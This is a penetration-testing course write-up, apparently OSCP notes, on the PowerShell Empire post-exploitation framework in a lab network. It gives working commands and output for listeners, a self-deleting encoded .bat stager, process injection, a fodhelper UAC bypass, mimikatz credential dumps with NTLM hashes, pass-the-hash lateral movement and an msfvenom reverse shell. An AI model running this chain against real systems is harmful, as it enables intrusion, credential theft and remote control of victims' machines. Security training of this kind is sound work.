---
layout: post
title:  "OSCP Origin Part 23"
author: haran
categories: [oscp , security , oscp_origin]
image: post_img/oscp_origin/oscp.png
beforetoc: "Powershell Empire"
toc: true
comments: false
rating: 3.5
---

Powershell Empire

23. PowerShell Empire

23. PowerShell Empire

 Empire is a “PowerShell and Python post-exploitation agent” with a heavy focus on client-side exploitation and post-exploitation of Active Directory (AD) deployments.
 
 Exploitation and post-exploitation are performed using PowerShell on Windows, and Python onLinux and macOS. 
 
 Empire relies on standard pre-installed libraries and features; PowerShell execution requires only PowerShell version 2 (pre-installed since Windows 7) and Linux and Mac modules require Python 2.6 or 2.7.

 While Empire seems to share many features with the Metasploit Framework, they are quite different in nature.
 
 Metasploit includes a vast collection of exploits designed to gain initial access.
  
 Empire,on the other hand, is designed as a post-exploitation tool targeted primarily at Active Directory environments. 
 
 It tends to leverage built-in features of the target operating system and its major applications.
 
23.1 Installation, Setup, and Usage

23.1 Installation, Setup, and Usage


• To install Empire on Kali Linux, we’ll clone the project from the public GitHub repository with gitclone, and run the install.sh script:

kali@kali:~$ cd /opt
kali@kali:/opt$ sudo git clone https://github.com/PowerShellEmpire/Empire.git
Cloning into 'Empire'...
remote: Enumerating objects: 12216, done.
remote: Total 12216 (delta 0), reused 0 (delta 0), pack-reused 12216
Receiving objects: 100% (12216/12216), 21.96 MiB | 3.22 MiB/s, done.
Resolving deltas: 100% (8312/8312), done.
kali@kali:/opt$ cd Empire/
kali@kali:/opt/Empire$ sudo ./setup/install.sh
...


• Empire allows for collaboration between penetration testers across multiple servers using shared private keys and by extension, shared passwords. 

• However, we are installing a single instance, so we’ll press I at the password prompt to generate a random password.

...
[>] Enter server negotiation password, enter for random generation:

• With the framework installed, we can launch Empire with the apt ly-named Python script, empire.

kali@kali:/opt/Empire$ sudo ./empire
...
================================================================
[Empire] Post-Exploitation Framework
================================================================
[Version] 2.5 | [Web] https://github.com/empireProject/Empire
================================================================
 _______ .___ ___. .______ __ .______ _______
 | ____|| \/ | | _ \ | | | _ \ | ____|
 | |__ | \ / | | |_) | | | | |_) | | |__
 | __| | |\/| | | ___/ | | | / | __|
 | |____ | | | | | | | | | |\ \----.| |____
 |_______||__| |__| | _| |__| | _| `._____||_______|
 285 modules currently loaded
 0 listeners currently active
 0 agents currently active
(Empire) >
23.1.1 PowerShell Empire Syntax


We can use help to list various commands available within Empire, including listeners, stagers,agents, and modules.

(Empire) > help
Commands
========
agents Jump to the Agents menu.
creds Add/display credentials to/from the database.
exit Exit Empire
help Displays the help menu.
interact Interact with a particular agent.
list Lists active agents or listeners.
listeners Interact with active listeners.
load Loads Empire modules from a non-standard folder.
plugin Load a plugin file to extend Empire.
plugins List all available and active plugins.
preobfuscate Preobfuscate PowerShell module_source files
reload Reload one (or all) Empire modules.
report Produce report CSV and log files: sessions.csv, credentials.csv, mas
reset Reset a global option (e.g. IP whitelists).
resource Read and execute a list of Empire commands from a file.
searchmodule Search Empire module names/descriptions.
set Set a global option (e.g. IP whitelists).
show Show a global option (e.g. IP whitelists).
usemodule Use an Empire module.
usestager Use an Empire stager
23.1.2 Listeners and Stagers
 
 We’ll begin our tour of Empire with a brief discussion of listeners and stagers.
 
 Equivalent to Metasploit’s multi/handler, listeners accept inbound connections from various Empire agents.
 
 Stagers are small pieces of code generated by Empire that are executed on the victim and connect back to a listener.
 
 They set up a connection between the victim and the attacker and perform additional tasks to facilitate the transfer of a staged payload.
 
 To begin an Empire session, we will first enter the listeners context, then print available listeners with use listener followed by a space and a double tab to engage Empire’s tab completion feature.

(Empire) > listeners
[!] No listeners currently active
(Empire: listeners) > uselistener
dbx http_com http_hop meterpreter
http http_foreign http_mapi redirector



 The http listener is the most basic listener and like the windows/meterpreter/reverse_http payload in Metasploit, communicates through a series of HTTP GET and POST requests to simulate legitimate HTTP traffic.


Once we’ve chosen a listener, we can run the use listener command to select it and info to display information and syntax:

(Empire: listeners) > uselistener http

(Empire: listeners/http) > info

Name: HTTP[S]
Category: client_server
Authors:
 @harmj0y
Description:
 Starts a http[s] listener (PowerShell or Python) that uses a
 GET/POST approach.
HTTP[S] Options:
Name Required Value Description
---- -------- ------- -----------
...
KillDate False Date for the listener t
o exit (MM/dd/yyyy).
Name True http Name for the listener.
Launcher True powershell -noP -sta -w 1 -enc Launcher string.
DefaultDelay True 5 Agent delay/reach back
interval (in seconds).
DefaultLostLimit True 60 Number of missed checki
ns before exiting
WorkingHours False Hours for the agent to
operate (09:00-17:00).
...
Host True http://10.11.0.4:80 Hostname/IP for staging.
CertPath False Certificate path for ht
tps listeners.
DefaultJitter True 0.0 Jitter in agent reachba
ck interval (0.0-1.0).
Proxy False default Proxy to use for reques
t (default, none, or other).
...
BindIP True 0.0.0.0 The IP to bind to on th
e control server.
Port True 80 Port for the listener.
ServerVersion True Microsoft-IIS/7.5 Server header for the c
ontrol server.
...

 As shown in the above listing, there are many options, but most are already set or are optional.
 
 The most important parameters are Host and Port, which are used to select the local IP address or hostname and the port number of the listener, respectively. 
 
 We can set the Host as follows:

(Empire: listeners) > set Host 10.11.0.4
(Empire: listeners) >

 There are additional settings worth noting.
 
 Default Delay attempts to simulate more legitimate HTTP traffic by setting the wait interval callback time from the compromised host to the listener.
 
 Default Jitter makes the traffic seem less programmatically generated by setting Default Delay to a random offset.
 
 Kill Date will self-terminate the listeners on all compromised hosts on the specified date.
 
  This is especially useful when performing clean up after a penetration test.


 Once the options are set, we can start the listener with the execute command and return to the main listener menu with back.
 
 Lastly, we can list all available stagers with usestager followed by space and double tab

(Empire: listeners/http) > execute
[*] Starting listener 'http'
* Serving Flask app "http" (lazy loading)
* Environment: production
 WARNING: Do not use the development server in a production environment.
 Use a production WSGI server instead.
* Debug mode: off
[+] Listener successfully started!
(Empire: listeners/http) > back
(Empire: listeners) > usestager
multi/bash osx/launcher windows/launcher_bat
multi/launcher osx/macho windows/launcher_lnk
multi/macro osx/macro windows/launcher_sct
multi/pyinstaller osx/pkg windows/launcher_vbs
multi/war osx/safari_launcher windows/launcher_xml
osx/applescript osx/teensy windows/macro
osx/application windows/bunny windows/macroless_msword
osx/ducky windows/dll windows/teensy
osx/dylib windows/ducky
osx/jar windows/hta.

 As shown in Listing 825, Empire supports stagers for Windows, Linux, and OS X.
 
 Windows stagers include support for standard DLLs, HTLM Applications, Microsoft Office macros, and more exotic stagers such as windows/ducky for use with the USB Rubber Ducky.
 
 To get an idea of how this works, let’s try out the windows/launcher_bat stager. After selecting the stager, we can review the options with the info command.

(Empire: listeners) > usestager windows/launcher_bat

(Empire: stager/windows/launcher_bat) > info

Name: BAT Launcher
Description:
 Generates a self-deleting .bat launcher for
 Empire.
Options:
 Name Required Value Description
 ---- -------- ------- -----------
 Listener True Listener to generate stager for.
 OutFile False /tmp/launcher.bat File to output .bat launcher to,
 otherwise displayed on the screen.
 Obfuscate False False Switch. Obfuscate the launcher
 powershell code, uses the
ObfuscateCommand for obfuscation type
For powershell only.
 ObfuscateCommand False Token\All\1,Launcher\STDIN++\12467The Invoke-Obfuscatio
 Only used if Obfuscate switch is True
For powershell only.
 Language True powershell Language of the stager to generate.
 ProxyCreds False default Proxy credentials
 ([domain\]username:password) to use f
 request (default, none, or other).
 UserAgent False default User-agent string to use for the stag
 request (default, none, or other).
 Proxy False default Proxy to use for request (default, no
 or other).
 Delete False True Switch. Delete .bat after running.
 StagerRetries False 0 Times for the stager to retry
 connecting.
 

 We can configure the Listener parameter with the set command followed by the name of the listener we just created. 
 
 Finally, we’ll create the stager with execute as shown in Listing 827.

Empire: stager/windows/launcher_bat) > set Listener http

(Empire: stager/windows/launcher_bat) > execute

[*] Stager output written out to: /tmp/launcher.bat

(Empire: stager/windows/launcher_bat) >

To better understand the stager we just created, let’s take a look at the partial content of the generated launcher.bat file.

kali@kali:/opt/Empire$ cat /tmp/launcher.bat

@echo off

start /b powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBp...

start /b "" cmd /c del "%~f0"&exit /b

The stager is a base64-encoded PowerShell command string. 

 This first-stage payload will connect to the listener and fetch the rest of the Empire agent code.


![dockerengine]({{ site.baseurl }}/post_img//oscp_origin/23/1.jpg)
23.1.3 The Empire Agent


 Now that we have our listener running and our stager prepared, we will need to deploy an agent on the victim.
 
 An agent is simply the final payload retrieved by the stager, and it allows us to execute commands and interact with the system.
 
 The stager (in this case the .bat file) deletes it self and exits once it finishes execution.

 Once the agent is operational on the target, it will set up an AES-encrypted communication channel with the listener using the data portion of the HTTP GET and POST requests.

 We will first copy the launcher.bat script to the Windows 10 workstation and execute it from acommand prompt.

![dockerengine]({{ site.baseurl }}/post_img//oscp_origin/23/2.jpg)

 After successful execution of the launcher script, an initial agent call will appear in our Empire session as shown in Listing 829:

(Empire: stager/windows/launcher_bat) > [+] Initial agent S2Y5XW1L from 10.11.0.22 now
active (Slack)

Next, we can use the agents command to display all active agents.

(Empire: stager/windows/launcher_bat) > agents

[*] Active agents:
Name Lang Internal IP Machine Name Username Process Delay
--------- ---- ----------- ------------ --------- ------- -----
S2Y5XW1L ps 10.11.0.22 CLIENT251 corp\offsec powershell/2976 5/0.0

(Empire: agents) >


 Now, we can use the interact command followed by the agent name to interact with our agent and execute commands.

 In this case, we will run sysinfo to retrieve information about the compromised host (Listing 831).

(Empire: agents) > interact S2Y5XW1L

(Empire: S2Y5XW1L) > sysinfo

(Empire: S2Y5XW1L) > sysinfo: 0|http://10.11.0.4:80|corp|offsec|CLIENT251|10.11.0.22|M
icrosoft Windows 10 Pro|False|powershell|2976|powershell|5

Listener: http://10.11.0.4:80
Internal IP: 10.11.0.22
Username: corp\offsec
Hostname: CLIENT251
OS: Microsoft Windows 10 Pro
High Integrity: 0
Process Name: powershell
Process ID: 2976
Language: powershell
Language Version: 5
...


 Note that the command does not return immediately.
 
 This delay is caused by the Default Delay parameter, which is currently set to the default value of five seconds.

 The help command (Listing 832) shows all available commands, such as upload, download, andscreenshot, which are self-explanatory.
 
 In addition, we can use shell to execute a command and spawn to create an additional agent on the same host.

(Empire: S2Y5XW1L) > help

Agent Commands
==============
agents Jump to the agents menu.
back Go back a menu.
bypassuac Runs BypassUAC, spawning a new high-integrity agent for a listener.
clear Clear out agent tasking.
creds Display/return credentials from the database.
download Task an agent to download a file.
exit Task agent to exit.
help Displays the help menu or syntax for particular commands.
info Display information about this agent
injectshellcode Inject listener shellcode into a remote process. Ex. injectshellcode
jobs Return jobs or kill a running job.
kill Task an agent to kill a particular process name or ID.
killdate Get or set an agent's killdate (01/01/2016).
list Lists all active agents (or listeners).
listeners Jump to the listeners menu.
lostlimit Task an agent to change the limit on lost agent detection
main Go back to the main menu.
mimikatz Runs Invoke-Mimikatz on the client.
psinject Inject a launcher into a remote process. Ex. psinject <listener> <pi
pth Executes PTH for a CredID through Mimikatz.
rename Rename the agent.
resource Read and execute a list of Empire commands from a file.
revtoself Uses credentials/tokens to revert token privileges.
sc Takes a screenshot, default is PNG. Giving a ratio means using JPEG.
scriptcmd Execute a function in the currently imported PowerShell script.
scriptimport Imports a PowerShell script and keeps it in memory in the agent.
searchmodule Search Empire module names/descriptions.
shell Task an agent to use a shell command.
sleep Task an agent to 'sleep interval [jitter]'
spawn Spawns a new Empire agent for the given listener name. Ex. spawn <li
steal_token Uses credentials/tokens to impersonate a token for a given process I
sysinfo Task an agent to get system information.
updateprofile Update an agent connection profile.
upload Task an agent to upload a file.
usemodule Use an Empire PowerShell module.
workinghours Get or set an agent's working hours (9:00-17:00).

(Empire: S2Y5XW1L) > 

 As with a meterpreter payload, Empire allows us to migrate our payload into a different process.
 
 We can do that by first using ps to view all running processes.
 
 Once we choose our target process, we’ll migrate the payload with ps inject command, including the name of the listener and the process id as our command arguments:

(Empire: S2Y5XW1L) > ps

ProcessName PID Arch UserName MemUsage
----------- --- ---- -------- --------
Idle 0 x86 N/A 0.00 MB
System 4 x86 N/A 0.00 MB
........
explorer 3568 x86 corp\offsec 3.41 MB
svchost 3820 x86 corp\offsec 9.18 MB
........
(Empire: S2Y5XW1L) > psinject http 3568

[*] Tasked U9M3SBHG to run TASK_CMD_JOB
[*] Agent U9M3SBHG tasked with task ID 4
[*] Tasked agent U9M3SBHG to run module powershell/management/psinject
Job started: BCMWAV
[*] Agent U9M3SBHG returned results
[*] Sending POWERSHELL stager (stage 1) to 10.11.0.22
[*] New agent DWZ49BAP checked in
[+] Initial agent DWZ49BAP from 10.11.0.22 now active (Slack)
[*] Sending agent (stage 2) to DWZ49BAP at 10.11.0.22 //-->

(Empire: S2Y5XW1L) > 


 It is important to note that, unlike the migration feature of the meterpreter payload, once the process migration is completed, the original Empire agent remains active and we must manually switch to the newly created agent as shown below:

(Empire: DWZ49BAP) > agents
[*] Active agents:
Name Lang Internal IP Machine Name Username Process Delay
--------- ---- ----------- ------------ --------- ------- -----
S2Y5XW1L ps 10.11.0.22 CLIENT251 corp\offsec powershell/2976 5/0.0
DWZ49BAP ps 10.11.0.22 CLIENT251 corp\offsec explorer/3568 5/0.0
(Empire: agents) > interact DWZ49BAP
(Empire: DWZ49BAP) > 
23.1.3.1 Exercises

Now that we’ve walked through the basic features of PowerShell Empire, try these exercises onyour own to solidify your knowledge.

1. Install and start PowerShell Empire on your Kali system.

3. Create a PowerShell Empire listener on your Kali machine and execute a stager on yourWindows 10 client.
 
5. Experiment with the PowerShell Empire agent and its basic functionality.
23.2 PowerShell Modules


 The power of Empire agents lies in the various modules offered by the framework.
 
  We can list all available modules by running use module followed by a space and double tab.
 
 (Empire: S2Y5XW1L) > usemodule
Display all 204 possibilities? (y or n)
code_execution/invoke_dllinjection
code_execution/invoke_metasploitpayload
code_execution/invoke_ntsd
code_execution/invoke_reflectivepeinjection
code_execution/invoke_shellcode
code_execution/invoke_shellcodemsil
collection/ChromeDump
collection/FoxDump
collection/USBKeylogger*
collection/WebcamRecorder
collection/browser_data
...

 
 The modules are divided into multiple categories but also include basic features such as keylogging, screenshots, and file downloads. 	
23.2.1 Situational Awareness


 Let’s take a look at a few modules to see what they consist of.
 
 We will target the dedicated Active Directory lab environment in this section.


 To begin, let’s explore the situational_awareness category.
 
 While there are many methods and commands for performing network enumeration, the primary focus of this category is on local client and Active Directory enumeration.

The Active Directory enumeration modules are found in the 
network subcategory with a prefix of PowerView. 
This is a reference to @harmj0y’s original
Veil-PowerView724 project.


 For example, we can use the get_user module and then issue the info command to display information about the module (Listing 836).

Pay close attention to the syntax in this example. To select a module from the
“empire base prompt”, we include the full path to the module. If we were not at
this base prompt, we would prepend the module path with powershell/.


(Empire:2Y5XW1L) > usemodule situational_awareness/network/powerview/get_user
(powershell/situational_awareness/network/powerview/get_user) > info
 Name: Get-DomainUser
 Module: powershell/situational_awareness/network/powerview/get_user
 NeedsAdmin: False
 OpsecSafe: True
 Language: powershell
MinLanguageVersion: 2
 Background: True
 OutputExtension: None
Authors:
 @harmj0y
Description:
 Query information for a given user or users in the specified
 domain. Part of PowerView.
Comments:
 https://github.com/PowerShellMafia/PowerSploit/blob/dev/Reco
 n/
Options:
Name Required Value Description
---- -------- ------- -----------
Domain False The domain to use for the query,
 defaults to the current domain.
LDAPFilter False Specifies an LDAP query string that is
used to filter Active Directory objects.
ServerTimeLimit False Specifies the maximum amount of time the
 server spends searching. Default of 120
seconds.
FindOne False Only return one result object.
TrustedToAuth False Switch. Return computer objects that are
 trusted to authenticate for other
principals.
PreauthNotRequired False Switch. Return user accounts with "Do
not require Kerberos preauthentication"
set.
Agent True S2Y5XW1L Agent to run module on.
Server False Specifies an active directory server
 (domain controller) to bind to
...




 Notice that the line breaks in this longer Empire command does not wrap correctly.
 
 This is only adisplay issue and does not affect our typed commands.

 Let’s take a look at the header section in the above listing.
 
  The Name, Module, and Language fieldsare self-explanatory.

 If the NeedsAdmin field is set to “True”, the script requires local Administrator permissions.

 If theOpsecSafe field is set to “True”, the script will avoid leaving behind indicators of compromise, suchas temporary disk files or new user accounts.
 
  This stealth-driven approach has a greater likelihoodof evading endpoint protection mechanisms.

 The MinLanguageVersion field describes the minimum version of PowerShell required to executethe script.

 This is especially relevant when working with Windows 7 or Windows Server 2008 R2targets as they ship with PowerShell version 2.

 Background tells us if the module executes in the background without visibility for the victim, whileOutputExtension tells us the output format if the module returns output to a file.


 There are several options in Listing 836.
 
 In this particular module, all options except Agent (whichis already set) are optional and the module will work as-is, enumerating all users in the target ActiveDirectory.

 We could set any number of filtering options or execute the module as shown in Listing 837.

> (powershell/situational_awareness/network/powerview/get_user) > execute
Job started: LP1URA
...
distinguishedname : CN=Jeff_Admin,OU=Admins,OU=CorpUsers,DC=corp,DC=com
objectclass : {top, person, organizationalPerson, user}
displayname : Jeff_Admin
lastlogontimestamp : 2/19/2019 8:15:57 PM
userprincipalname : jeff_admin@corp.com
name : Jeff_Admin
objectsid : S-1-5-21-3048852426-3234707088-723452474-1104
samaccountname : jeff_admin
admincount : 1
codepage : 0
samaccounttype : USER_OBJECT
accountexpires : NEVER
cn : Jeff_Admin
whenchanged : 2/19/2019 7:15:57 PM
instancetype : 4
usncreated : 12613
objectguid : 7bbdcd8c-e139-478c-86dd-abdef0f71d58
lastlogoff : 1/1/1601 1:00:00 AM
objectcategory : CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com
dscorepropagationdata : {2/19/2019 1:05:25 PM, 2/19/2019 12:56:22 PM, 1/1/1601 12:00:0
memberof : CN=Domain Admins,CN=Users,DC=corp,DC=com
...


 In addition to the enumeration tools in the PowerView subcategory, the situational_awareness category also includes a wide variety of network and port scanners.

 The Bloodhound module is especially noteworthy.
 
 It automates much of PowerView’s functionality,collecting all computers, users, and groups in the domain as well as all currently logged-in users.
 
 The output is stored in CSV files suitable for use with the backend BloodHound application,725 which uses graph theory726 to highlight often-overlooked and highly complex attack paths in an ActiveDirectory environment.
23.2.2 Credentials and Privilege Escalation

23.2.2 Credentials and Privilege Escalation

 The privesc category contains privilege escalation modules.
 
 One of the more interesting modulesin this group is powerup/all checks.
 
 727 It uses several techniques based on misconfigurations suchas unquoted service paths, improper permissions on service executables, and much more.

(Empire: powershell/situational_awareness/network/powerview/get_user) > usemodule powe
rshell/privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > execute
Job started: N459AD
[*] Running Invoke-AllChecks
[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.
...


 The bypassuac_fodhelper module is quite useful if we have access to a local administrator account.
 
 Depending on the local Windows version, this module can bypass UAC and launch a high-integrity PowerShell Empire agent:

(Empire: S2Y5XW1L) > usemodule privesc/bypassuac_fodhelper
(Empire: powershell/privesc/bypassuac_fodhelper) > info
Name: Invoke-FodHelperBypass
 Module: powershell/privesc/bypassuac_fodhelper
 NeedsAdmin: False
 OpsecSafe: False
 Language: powershell
MinLanguageVersion: 2
 Background: True
 OutputExtension: None
Authors:
 Petr Medonos
Description:
 Bypasses UAC by performing an registry modification for
 FodHelper (based on https://winscripting.blog/2017/05/12
 /first-entry-welcome-and-uac-bypass/)
Comments:
 https://winscripting.blog/2017/05/12/first-entry-welcome-
 and-uac-bypass/
Options:
Name Required Value Description
---- -------- ------- -----------
Listener True Listener to use.
UserAgent False default User-agent string to use for the staging
 request (default, none, or other).
Proxy False default Proxy to use for request (default, none,
 or other).
Agent True S2Y5XW1L Agent to run module on.
ProxyCreds False default Proxy credentials
 ([domain\]username:password) to use for
 request (default, none, or other).
(Empire: powershell/privesc/bypassuac_fodhelper) > set Listener http
(Empire: powershell/privesc/bypassuac_fodhelper) > execute
[>] Module is not opsec safe, run? [y/N] y
(Empire: powershell/privesc/bypassuac_fodhelper) >
Job started: 4STVDU
[+] Initial agent K678VC13 from 10.11.0.22 now active (Slack)
(Empire: powershell/privesc/bypassuac_fodhelper) >

 Once we have a high-integrity session, we can perform actions that require local administrator orSYSTEM rights, such as executing mimikatz to dump cached credentials.

(Empire: agents) > interact K678VC13
(Empire: K678VC13) > usemodule credentials/
credential_injection* mimikatz/extract_tickets mimikatz/sam*
enum_cred_store mimikatz/golden_ticket mimikatz/silver_ticket
invoke_kerberoast mimikatz/keys* mimikatz/trust_keys*
mimikatz/cache* mimikatz/logonpasswords* powerdump*
mimikatz/certs* mimikatz/lsadump* sessiongopher
mimikatz/command* mimikatz/mimitokens* tokens
mimikatz/dcsync mimikatz/pth* vault_credential*
mimikatz/dcsync_hashdump mimikatz/purge


 The credentials category in Listing 840 contains multiple mimikatz commands that have beenported into Empire. 
 
 The commands marked with an asterisk require a high-integrity Empire agent.

 Empire uses reflective DLL injection728 to load the mimikatz library into the agent directly frommemory.

 Loading our malicious executable in this way minimizes the risk of detection since most EDRsolutions only analyze files stored on the hard drive.

 This method is custom-coded into the agent as Windows does not expose anyofficial APIs (similar to LoadLibrary) that would allow us to achieve the sameobjective.

 Let’s take a look at a high-integrity access module such as logonpasswords:

(Empire: K678VC13) > usemodule credentials/mimikatz/logonpasswords
(Empire: powershell/credentials/mimikatz/logonpasswords) > execute
Job started: NXK271
Hostname: client251.corp.com / S-1-5-21-3048852426-3234707088-723452474
mimikatz(powershell) # sekurlsa::logonpasswords
Authentication Id : 0 ; 244851 (00000000:0003bc73)
Session : Interactive from 1
User Name : offsec
Domain : corp
Logon Server : DC01
Logon Time : 2/20/2019 10:36:32 PM
SID : S-1-5-21-3048852426-3234707088-723452474-1103
 msv :
 [00000003] Primary
 * Username : offsec
 * Domain : corp
 * NTLM : e2b475c11da2a0748290d87aa966c327
 * SHA1 : 8c77f430e4ab8acb10ead387d64011c76400d26e
 * DPAPI : c10c264a27b63c4e66728bbef4be8aab
 tspkg :
 wdigest :
 * Username : offsec
 * Domain : corp
 * Password : (null)
 kerberos :
 * Username : offsec
 * Domain : CORP.COM
 * Password : (null)
 ssp :
 credman :
...

 This output is identical to mimikatz but the collected credentials are also written into the credentialstore, which can be enumerated with creds:


(Empire: K678VC13) > creds
Credentials:
CredID CredType Domain UserName Host Password
------ -------- ------ -------- ---- --------
1 hash corp.com offsec client251 e2b475c11da2a0748290d87aa966c32
2 hash corp.com CLIENT251$ client251 4d4ae0e7cb16d4cfe6a91412b3d80ed


 We can also manually enter data into the credentials store with creds add as shown in Listing 843.

(Empire: K678VC13) > creds add corp.com jeff_admin Qwerty09!
Credentials:
CredID CredType Domain UserName Host Password
------ -------- ------ -------- ---- --------
1 hash corp.com offsec client251 e2b475c11da2a0748290d87aa966c32
2 hash corp.com CLIENT251$ client251 4d4ae0e7cb16d4cfe6a91412b3d80ed
3 plaintext corp.com jeff_admin Qwerty09!
23.2.3 Lateral Movement


Once we gain valid user credentials, we can use them to log into additional systems until we reachour objective. This is known as lateral movement.

In our labs, the domain controller is located on an internal network, meaning we can not reach itfrom our Kali VM. To demonstrate the mechanics of lateral movement within Empire, we’ll obtainanother shell on the Windows 10 client in the context of a different user.Although this example is simplified because of the single target VM, the mechanics of the processwill be the same when moving to a different remote host in a real-world situation.There are various vectors in the lateral_movement category that we can use to invoke an Empireagent on a remote host:

(Empire: K678VC13) > usemodule lateral_movement/technique
inveigh_relay invoke_psremoting invoke_wmi
invoke_dcom invoke_smbexec invoke_wmi_debugger
invoke_executemsbuild invoke_sqloscmd jenkins_script_console
invoke_psexec invoke_sshcommand new_gpo_immediate_task

As an example we will try out the invoke_smbexec module, which requires several parameters.We’ll set ComputerName to the hostname of the Windows 10 client (client251) and set Listener to“http”. We will also set the Username, Domain, and Hash parameters using the relevant data fromthe jeff_admin user account found in the previous section (Listing 843). This is configured in (Listing845)

We can use either the set CredID command to specify the ID number of the entry
from the credentials store or manually enter all the credentials. Note that in this
case, the passwords for both Offsec and Jeff_admin coincide.


(Empire: K678VC13) > usemodule lateral_movement/invoke_smbexec
(Empire: powershell/lateral_movement/invoke_smbexec) > info
 Name: Invoke-SMBExec
 Module: powershell/lateral_movement/invoke_smbexec
 NeedsAdmin: False
 OpsecSafe: True
 Language: powershell
MinLanguageVersion: 2
 Background: False
 OutputExtension: None
...
Options:
Name Required Value Description
---- -------- ------- -----------
CredID False CredID from the store to use.
ComputerName True Host[s] to execute the stager on, comma
 separated.
Service False Name of service to create and delete.
 Defaults to 20 char random.
ProxyCreds False default Proxy credentials
 ([domain\]username:password) to use for
 request (default, none, or other).
Username True Username.
Domain False Domain.
Hash True NTLM Hash in LM:NTLM or NTLM format.
Agent True K678VC13 Agent to run module on.
Listener True Listener to use.
...
(Empire: powershell/lateral_movement/invoke_smbexec) > set ComputerName client251
(Empire: powershell/lateral_movement/invoke_smbexec) > set Listener http
(Empire: powershell/lateral_movement/invoke_smbexec) > set Username jeff_admin
(Empire: powershell/lateral_movement/invoke_smbexec) > set Hash e2b475c11da2a0748290d8
7aa966c327
(Empire: powershell/lateral_movement/invoke_smbexec) > set Domain corp.com
(Empire: powershell/lateral_movement/invoke_smbexec) > execute
Command executed with service CVTERKCMPMMECQLRWLKB on client251
[*] Sending POWERSHELL stager (stage 1) to 10.11.0.22
[*] New agent UXVZ2NC3 checked in
[+] Initial agent UXVZ2NC3 from 10.11.0.22 now active (Slack)
...


Excellent! The agent was successfully deployed and we can now interact with it:

(Empire: K678VC13) > agents
[*] Active agents:
Name Lang Internal IP Machine Name Username Process Delay
--------- ---- ----------- ------------ --------- ------- -----
S2Y5XW1L ps 10.11.0.22 CLIENT251 corp\offsec powershell/2976 5/0.0
DWZ49BAP ps 10.11.0.22 CLIENT251 corp\offsec explorer/3568 5/0.0
K678VC13 ps 10.11.0.22 CLIENT251 *corp\offsec powershell/6236 5/0.0
UXVZ2NC3 ps 10.11.0.22 CLIENT251 *corp\SYSTEM powershell/3912 5/0.0
(Empire: agents) > interact UXVZ2NC3
(Empire: UXVZ2NC3) > 
23.3 Switching Between Empire and Metasploit


 The Empire agent supports many features.
 
 However, there are often times when we need to use features that are only found in Metasploit.

 Since we can have both Empire and Metasploit shells on the same compromised host, this is actually quite easy.
 
 In PowerShell Empire version 2.4, it was possible to use a meterpreter listener
and the injectshellcode module to inject a meterpreter shellcode directly in
memory from PowerShell. However, in the newest version (2.5) this code is
unfortunately broken.
 
 If a PowerShell Empire agent is active on the host, we can use msfvenom to generate a meterpreter reverse shell as an executable.
 
 kali@kali:~$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.11.0.4 LPORT=7777 -
f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 633 bytes
Final size of exe file: 73802 bytes
Saved as: met.exe

 
 We then set up a Metasploit listener using the multi/handler module and the previously-chosen settings:
 
 msf5 > use multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
msf5 exploit(multi/handler) > set LPORT 7777
LPORT => 7777
msf5 exploit(multi/handler) > set LHOST 10.11.0.4
LHOST => 10.11.0.4
msf5 exploit(multi/handler) > exploit
[*] Started HTTP reverse handler on http://10.11.0.4:7777

 
 Now we switch back to our PowerShell Empire shell and upload the executable:
 
 Empire: S2Y5XW1L) > upload /home/kali/met.exe
[*] Tasked agent to upload met.exe, 72 KB
[*] Tasked S2Y5XW1L to run TASK_UPLOAD
[*] Agent S2Y5XW1L tasked with task ID 12
[*] Agent S2Y5XW1L returned results.
[*] Valid results returned by 10.11.0.22
Empire: S2Y5XW1L) > shell dir
[*] Tasked S2Y5XW1L to run TASK_SHELL
[*] Agent S2Y5XW1L tasked with task ID 3
[*] Agent S2Y5XW1L returned results.
Directory: C:\Users\offsec.corp\Downloads>
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 10/2/2019 11:24 AM 73802 met.exe
..Command execution completed.
[*] Valid results returned by 10.11.0.22 
 
 After uploading the executable, we issue the dir shell command (Listing 849) to reveal its locationand execute it:
 
 
 (Empire: S2Y5XW1L) > shell C:\Users\offsec.corp\Downloads>met.exe
[*] Tasked S2Y5XW1L to run TASK_SHELL
[*] Agent S2Y5XW1L tasked with task ID 5
[*] Agent S2Y5XW1L returned results.
..Command execution completed.
[*] Valid results returned by 10.11.0.22
 
 With the executable running, we’ll switch back to our meterpreter listener and watch the incomingshell:
 
 [*] Started HTTP reverse handler on http://10.11.0.4:7777
[*] http://10.11.0.4:7777 handling request from 10.11.0.22; Staging x86 payload (18082
[*] Meterpreter session 1 opened (10.11.0.4:7777 -> 10.11.0.22:50597)
meterpreter>
 
 Reversing this process to connect to an Empire agent from an existing meterpreter session is alsosimple. 
 
 We can create a launcher (.bat format) and use meterpreter to upload and execute it. 
 
 Firstwe’ll create the launcher using Empire
 
 (Empire: listeners) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute
[*] Stager output written out to: /tmp/launcher.bat
 
 Then we can upload and execute it:
 
 meterpreter > upload /tmp/launcher.bat
[*] uploading : /tmp/launcher.bat -> launcher.bat
[*] Uploaded 4.69 KiB of 4.69 KiB (100.0%): /tmp/launcher.bat -> launcher.bat
[*] uploaded : /tmp/launcher.bat -> launcher.bat
meterpreter > shell
Process 4644 created.
Channel 2 created.
C:\Users\offsec.corp\Downloads>dir
dir
Volume in drive C has no label.
Volume Serial Number is 9E6A-47F8
Directory of C:\Users\offsec.corp\Downloads
09/19/2019 08:42 AM <DIR> .
09/19/2019 08:42 AM <DIR> ..
09/19/2019 08:42 AM 4,802 launcher.bat
 1 File(s) 4,802 bytes
 2 Dir(s) 2,022,359,040 bytes free
C:\Users\offsec.corp\Downloads>launcher.bat
launcher.bat

 
 Now we should receive an Empire agent from the compromised host:
 
 (Empire: agents) > [+] Initial agent LEBYRW67 from 10.11.0.22 now active (Slack)

 
 Using these techniques, we can take advantage of both frameworks on the same compromisedhost.
23.3.1.1 Exercises


